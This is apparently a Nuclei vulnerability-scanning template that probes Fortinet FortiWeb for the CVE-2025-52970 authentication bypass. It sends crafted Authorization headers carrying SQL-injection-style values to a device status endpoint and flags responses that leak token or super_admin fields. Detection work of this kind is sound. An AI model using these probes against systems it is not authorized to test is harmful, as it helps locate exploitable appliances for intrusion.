id: CVE-2025-52970
info:
  name: Fortinet FortiWeb - CVE-2025-52970 (Broken Access Control / Auth Bypass) - Non-destructive Probes
  author: gsharma101
  severity: high
  description: |
    Non-destructive probes for an authentication bypass vulnerability in Fortinet FortiWeb (CVE-2025-52970).
    Vulnerable versions improperly handle Authorization header parameters, allowing unauthenticated attackers
    to bypass access control. This template performs safe, read-only requests to /api/fabric/device/status
    with crafted Authorization headers. It flags responses where the server unexpectedly returns 200/500 along
    with JSON fields like token, role, or super_admin. The template avoids destructive SQLi/file-write actions
    from the public exploit chain.
  reference:
    - https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970
    - https://github.com/Hex00-0x4/FortiWeb-CVE-2025-52970-Authentication-Bypass
  tags: fortinet,fortiweb,cve-2025-52970,auth-bypass
  classification:
    cve-id: "CVE-2025-52970"

requests:
  - id: probe-bearer-test
    method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"
    headers:
      Authorization: "Bearer ';test"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
      - type: word
        words:
          - "token"
          - "\"role\""
          - "super_admin"
        part: body
      - type: word
        words:
          - "application/json"
        part: header

  - id: probe-bearer-comment
    method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"
    headers:
      Authorization: "Bearer ';--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
      - type: word
        words:
          - "token"
          - "\"role\""
          - "super_admin"
        part: body
      - type: word
        words:
          - "application/json"
        part: header

  - id: probe-bearer-escaped
    method: GET
    path:
      - "{{BaseURL}}/api/fabric/device/status"
    headers:
      Authorization: "Bearer '\\';--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
      - type: word
        words:
          - "token"
          - "\"role\""
          - "super_admin"
        part: body
      - type: word
        words:
          - "application/json"
        part: header
